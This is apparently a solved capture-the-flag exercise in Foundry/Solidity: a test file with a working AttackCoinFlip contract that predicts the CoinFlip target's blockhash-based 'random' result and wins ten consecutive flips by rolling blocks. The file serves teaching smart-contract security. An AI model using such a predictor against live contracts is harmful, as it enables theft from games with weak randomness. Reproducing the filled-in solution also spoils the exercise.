// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {CoinFlip} from "../src/CoinFlip.sol";

/// @dev Fill in `attack()` — compute the same "random" side as CoinFlip, then flip.
contract AttackCoinFlip {
    CoinFlip public immutable target;
    uint256 constant FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(CoinFlip _target) {
        target = _target;
    }

    function attack() public {
        // ========== YOUR ATTACK LOGIC HERE ==========
        // 1. Read blockhash(block.number - 1) the same way CoinFlip does
        uint256 blockValue = uint256(blockhash(block.number - 1));
        // 2. Divide by FACTOR to get the side (true / false)
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        // 3. Call target.flip(side)
        target.flip(side);
        // ========== END ATTACK LOGIC ==========
    }
}

contract CoinFlipTest is Test {
    CoinFlip public target;
    AttackCoinFlip public attackContract;

    address public attacker = makeAddr("attacker");

    function setUp() public {
        target = new CoinFlip();

        vm.prank(attacker);
        attackContract = new AttackCoinFlip(target);
    }

    function testExploit() public {
        // Win condition:
        //   consecutiveWins == 10
        //
        // Hints (look at CoinFlip.sol carefully):
        //   - The "random" bit is derived from blockhash(block.number - 1) / FACTOR
        //   - Your attack contract can compute the EXACT same value in the same tx
        //   - flip() reverts if you call it twice in the same block (lastHash check)
        //   - So you must win once per block, ten times
        //
        // Tip (Foundry): advance one block between attacks with:
        //   vm.roll(block.number + 1);

        vm.startPrank(attacker);

        // ========== YOUR EXPLOIT HERE ==========
        for (uint256 i = 0; i < 10; i++) {
            vm.roll(block.number + 1);
            attackContract.attack();
        }
        // ========== END EXPLOIT ==========

        vm.stopPrank();

        assertEq(target.consecutiveWins(), 10, "need 10 consecutive wins");
    }
}
